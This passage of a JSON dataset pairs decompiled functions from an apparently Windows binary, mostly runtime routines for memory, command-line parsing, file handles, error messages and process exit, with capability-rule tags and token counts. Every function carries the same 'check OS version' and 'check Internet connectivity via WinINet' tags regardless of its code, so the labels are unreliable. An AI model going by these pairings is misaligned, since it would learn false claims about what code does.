        "decompiled_code": "\nuint32_t fcn.004025b8(void)\n\n{\n    uint32_t in_EAX;\n    \n    if (*0x4a604d != '\\0') {\n        while (in_EAX = fcn.00401450(),  in_EAX != '\\0') {\n            if (*0x4a65b5 == '\\0') {\n                sub.kernel32.dll_Sleep();\n                in_EAX = fcn.00401450();\n                if (in_EAX == '\\0') break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n    }\n    if (*0x4a87bc == 0) {\n        in_EAX = sub.kernel32.dll_VirtualAlloc(0, 0x10000, 0x1000, 4);\n        *0x4a87bc = in_EAX;\n    }\n    return in_EAX & 0xffffff00 | *0x4a87bc != 0;\n}\n",
        "token_count": 203
    },
    "0040266c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040266c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    if (*0x4a87bc != NULL) {\n        cVar1 = fcn.004025b8();\n        if (cVar1 != '\\0') {\n            iVar3 = **0x4a87bc;\n            if (-1 < iVar3 + -1) {\n                iVar2 = 0;\n                do {\n                    if (in_EAX == (*0x4a87bc)[iVar2 + 1]) {\n                        (*0x4a87bc)[iVar2 + 1] = (*0x4a87bc)[**0x4a87bc];\n                        **0x4a87bc = **0x4a87bc + -1;\n                        uVar4 = 1;\n                        break;\n                    }\n                    iVar2 = iVar2 + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            *0x4a87c0 = 0;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 269
    },
    "00402ccc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402ccc(void)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar4 = 0x37;\n    ppcVar3 = 0x4a1060;\n    do {\n        if (*ppcVar3 == NULL) {\n            *ppcVar3 = fcn.00401590;\n        }\n        ppcVar3[-2] = ppcVar3 + -7;\n        ppcVar3[-6] = ppcVar3 + -7;\n        ppcVar3[-4] = NULL;\n        ppcVar3[-5] = 0x1;\n        uVar2 = (*(ppcVar3 + -0x1a) * 0xc + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0xb30) {\n            uVar2 = 0xb30;\n        }\n        uVar2 = uVar2 + 0x4d0 >> 0xd;\n        if (7 < uVar2) {\n            uVar2 = 7;\n        }\n        *(ppcVar3 + -0x1b) = -1 << (uVar2 & 0x1f);\n        *(ppcVar3 + -1) = (uVar2 << 0xd) + 0xb30;\n        uVar1 = *(ppcVar3 + -0x1a);\n        uVar2 = (uVar1 * 0x30 + 0xef & 0xffffff00) + 0x30;\n        if (uVar2 < 0x7330) {\n            uVar2 = 0x7330;\n        }\n        if (0xff30 < uVar2) {\n            uVar2 = 0xff30;\n        }\n        *(ppcVar3 + -2) = (((uVar2 - 0x20) / uVar1) * uVar1 + 0xef & 0xff00) + 0x30;\n        ppcVar3 = ppcVar3 + 8;\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    fcn.00402c88();\n    *0x4a6708 = 0x4a6708;\n    *0x4a670c = 0x4a6708;\n    iVar5 = 0x400;\n    iVar4 = 0x4a67a8;\n    do {\n        *iVar4 = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x4a87ac = 0x4a87ac;\n    *0x4a87b0 = 0x4a87ac;\n    return;\n}\n",
        "token_count": 653
    },
    "00402e84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402e84(void)\n\n{\n    if (*0x4a87c4 != 0) {\n        sub.user32.dll_DestroyWindow(*0x4a87c4);\n        *0x4a87c4 = 0;\n    }\n    if (*0x4a65b4 != '\\0') {\n        fcn.00402810();\n    }\n    if (*0x4a87bc != 0) {\n        sub.kernel32.dll_VirtualFree(*0x4a87bc, 0, 0x8000);\n        *0x4a87bc = 0;\n    }\n    fcn.00402df4();\n    return;\n}\n",
        "token_count": 149
    },
    "00403040": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403040(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x4a6008 != NULL) {\n        (**0x4a6008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.004075b8();\n    }\n    fcn.00402fe8();\n    return;\n}\n",
        "token_count": 84
    },
    "00402f74": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402f74(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.004075b8();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.004075b8();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "00402f94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402f94(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.004075b8();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.004075b8();\n        return *(*piVar1 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "0040304c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403021)\n// WARNING: Removing unreachable block (ram,0x00403026)\n\nvoid __fastcall fcn.0040304c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004075b8(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x4a6008 != NULL) {\n            (**0x4a6008)();\n        }\n        fcn.004075b8();\n        fcn.00402fe8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "004031ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004031ec(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t *puStack20;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puStack20 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (puVar3 = in_EAX,  0x20 < *puVar3) {\n        if (*puVar3 == 0x22) {\n            puVar2 = sub.user32.dll_CharNextA(puVar3);\n            while ((puVar5 = puVar2,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar2 = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n            in_EAX = puVar5;\n            if (*puVar5 != 0) {\n                in_EAX = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            in_EAX = sub.user32.dll_CharNextA();\n            puStack20 = puVar3;\n        }\n    }\n    fcn.00405b8c();\n    iVar1 = *param_2;\n    iVar6 = 0;\n    puVar3 = puStack20;\n    while (puVar2 = puVar3,  0x20 < *puVar2) {\n        if (*puVar2 == 0x22) {\n            puVar3 = sub.user32.dll_CharNextA(puVar2);\n            while ((puVar5 = puVar3,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar4 = sub.user32.dll_CharNextA(puVar2);\n                for (puVar3 = puVar5; puStack20 = puVar5,  puVar3 < puVar4; puVar3 = puVar3 + 1) {\n                    *(iVar1 + iVar6) = *puVar3;\n                    iVar6 = iVar6 + 1;\n                }\n            }\n            puVar3 = puVar5;\n            if (*puVar5 != 0) {\n                puVar3 = sub.user32.dll_CharNextA(puVar2);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            puVar5 = sub.user32.dll_CharNextA();\n            for (puVar3 = puVar2; puStack20 = puVar2,  puVar3 < puVar5; puVar3 = puVar3 + 1) {\n                *(iVar1 + iVar6) = *puVar3;\n                iVar6 = iVar6 + 1;\n            }\n        }\n    }\n    return CONCAT44(puStack20, puVar2);\n}\n",
        "token_count": 731
    },
    "004032e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403320)\n\nvoid fcn.004032e8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x403339;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    sub.kernel32.dll_GetCommandLineA();\n    fcn.004031ec();\n    fcn.004031ec();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x403340;\n    uStack24 = 0x403338;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 176
    },
    "00403348": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403348(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar auStack276 [264];\n    \n    fcn.0040546c();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack276, 0x105);\n        fcn.0040555c();\n    }\n    else {\n        sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            fcn.004031ec();\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0040348c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040348c(uint param_1, ushort param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    uVar1 = *(in_EAX + 4);\n    if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {\n        iVar2 = 0x66;\n    }\n    else {\n        if (uVar1 != 0xd7b0) {\n            fcn.00403908();\n        }\n        *(in_EAX + 4) = param_2;\n        if ((*(in_EAX + 0x48) == '\\0') && (*(in_EAX + 0x18) == 0)) {\n            *(in_EAX + 0x18) = 0x4035b4;\n        }\n        iVar2 = (**(in_EAX + 0x18))();\n    }\n    if (iVar2 != 0) {\n        fcn.0040306c();\n    }\n    return iVar2;\n}\n",
        "token_count": 241
    },
    "00403d78": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d78(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 1) != 0xd7b0) {\n        if (3 < *(in_EAX + 1) - 0xd7b0) goto code_r0x00403e4c;\n        iVar1 = (*in_EAX[9])();\n        if (iVar1 != 0) {\n            fcn.0040306c();\n        }\n    }\n    *(in_EAX + 1) = 0xd7b3;\n    in_EAX[2] = param_2;\n    in_EAX[9] = 0x403d50;\n    in_EAX[7] = 0x403544;\n    if (*(in_EAX + 0x12) == '\\0') {\n        in_EAX[9] = 0x403544;\n        if (param_1 == 3) {\n            uVar2 = 0xfffffff5;\n        }\n        else {\n            uVar2 = 0xfffffff6;\n        }\n        iVar1 = sub.kernel32.dll_GetStdHandle(uVar2);\n    }\n    else {\n        if (((param_1 != 3) && (param_1 != 2)) && (*(in_EAX + 1) = 0xd7b2,  param_1 != 1)) {\n            *(in_EAX + 1) = 0xd7b1;\n        }\n        iVar1 = sub.kernel32.dll_CreateFileA();\n    }\n    if (iVar1 != -1) {\n        *in_EAX = iVar1;\n        return;\n    }\n    *(in_EAX + 1) = 0xd7b0;\n    sub.kernel32.dll_GetLastError();\ncode_r0x00403e4c:\n    fcn.0040306c();\n    return;\n}\n",
        "token_count": 434
    },
    "00404020": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404020(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    while (0x40 < param_2) {\n        param_2 = param_2 + -0x40;\n        fcn.00403fcc();\n        iVar2 = fcn.004075b8();\n        if (*(iVar2 + 4) != 0) {\n            return in_EAX;\n        }\n    }\n    if (0 < param_2) {\n        puVar3 = 0x404050;\n        if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f88(param_2, 0x404050),  cVar1 != '\\0')) {\n            while( true ) {\n                puVar4 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n                iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n                if (param_2 < iVar2) break;\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n                param_2 = param_2 - iVar2;\n                for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar2 = (**(in_EAX + 0x1c))();\n                if (iVar2 != 0) {\n                    fcn.0040306c();\n                    return in_EAX;\n                }\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_2;\n            for (; param_2 != 0; param_2 = param_2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        return in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 506
    },
    "004046f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004046f4(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x404778;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.00404788();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.004046c4();\n            fcn.00406f54();\n        }\n        else {\n            *param_1 = in_EAX + *(iVar1 + 0x14);\n            if (*param_1 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40477f;\n    uStack32 = 0x404777;\n    fcn.00406f3c();\n    return;\n}\n",
        "token_count": 285
    },
    "0040483c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040483c(uint param_1, uint param_2)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.0040480c(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00404849. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x4a602c != NULL) {\n        (**0x4a602c)();\n    }\n    *0x4a1004 = param_2;\n    *0x4a1000 = 0xd2;\n    fcn.00405378();\n    return;\n}\n",
        "token_count": 174
    },
    "00404a38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a38(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x4a1028 != '\\0') {\n        auStack12[0] = param_2;\n        (**0x4a6014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "004052ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004052ec(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char *pcStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x4a604c != '\\0') {\n        if ((*0x4a6220 == -0x284e) && (*0x4a6228 != 0)) {\n            uStack8 = 0x405315;\n            (**0x4a6238)();\n        }\n        pcStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        pcStack16 = 0x1e;\n        pcStack20 = \"Runtime error     at 00000000\";\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x40532a;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x405374, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x4a1030 == '\\0') {\n        uStack8 = 0;\n        pcStack12 = \"Error\";\n        pcStack16 = \"Runtime error     at 00000000\";\n        pcStack20 = NULL;\n        uStack24 = 0x405369;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00405378": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405378(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x4a87f0 == 0) && (*0x4a6048 != NULL)) {\n        do {\n            pcVar1 = *0x4a6048;\n            *0x4a6048 = NULL;\n            (*pcVar1)();\n        } while (*0x4a6048 != NULL);\n    }\n    if (*0x4a1004 != 0) {\n        fcn.00405258();\n        fcn.004052ec();\n        *0x4a1004 = 0;\n    }\n    do {\n        if ((*0x4a87f0 == 2) && (*0x4a1000 == 0)) {\n            *0x4a87d4 = 0;\n        }\n        fcn.00405100();\n        if (((*0x4a87f0 < 2) || (*0x4a1000 != 0)) && (*0x4a87d8 != 0)) {\n            fcn.00406ecc();\n            iVar2 = *(*0x4a87d8 + 0x10);\n            if ((iVar2 != *(*0x4a87d8 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.004050d8();\n        if (*0x4a87f0 == 1) {\n            (**0x4a87ec)();\n        }\n        if (*0x4a87f0 != 0) {\n            fcn.004052bc();\n        }\n        if (*0x4a87c8 == NULL) {\n            if (*0x4a6028 != NULL) {\n                (**0x4a6028)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x4a1000);\n        }\n        puVar3 = *0x4a87c8;\n        puVar4 = 0x4a87c8;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 534
    },
    "0040600c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040600c(void)\n\n{\n    if (*0x4a1010 != NULL) {\n        (**0x4a1010)();\n        return;\n    }\n    fcn.00403040();\n    return;\n}\n",
        "token_count": 51
    },
    "00406024": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
